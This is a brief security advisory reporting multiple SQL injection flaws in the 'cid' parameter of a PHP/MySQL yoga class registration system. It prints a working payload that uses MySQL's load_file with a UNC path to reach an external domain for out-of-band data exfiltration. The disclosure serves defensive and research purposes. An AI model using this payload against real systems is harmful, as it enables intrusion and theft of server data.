## Title: Yoga Class Registration -1.0-2023 - Multiple SQLi
## Author: nu11secur1ty
## Date: 02.27.2023
## Vendor: https://github.com/oretnom23
## Software: https://www.sourcecodester.com/php/16097/yoga-class-registration-system-php-and-mysql-free-source-code.html
## Reference: https://portswigger.net/web-security/sql-injection

## Description:
The `cid` parameter appears to be vulnerable to Multiple-SQL injection
attacks. The payload '+(select
load_file('\\\\aaob4nk5vd0lv9e50qp2c5c1dsjl7iv9yxpkg85.stupid.com\\shs'))+'
was submitted in the cid parameter. This payload injects a SQL
sub-query that calls MySQL's load_file function with a UNC file path
that references a URL on an external domain.
The attacker easily can steal all information about this server and
this could be awful for all users of this system.

STATUS: HIGH Vulnerability - CRITICAL
